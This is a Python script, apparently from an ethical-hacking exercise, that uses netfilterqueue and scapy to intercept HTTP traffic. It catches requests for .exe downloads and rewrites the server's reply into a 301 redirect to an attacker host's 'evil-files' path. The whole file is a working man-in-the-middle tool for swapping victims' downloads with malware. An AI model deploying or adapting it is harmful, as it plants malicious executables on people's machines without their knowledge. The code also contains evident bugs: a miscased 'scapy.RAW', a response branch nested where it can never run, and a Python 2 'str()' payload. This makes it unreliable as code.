#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []

def scapy_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 8080:
            # print("HTTP Request")
            if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.30.139" not in scapy_packet[scapy.RAW].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 8080:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing File")
                    scapy_packet = scapy_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://192.168.30.139/evil-files\n\n")

                    packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()    #this is use to filter the queue
queue.bind(0, process_packet)
queue.run()             #it run the command in each queue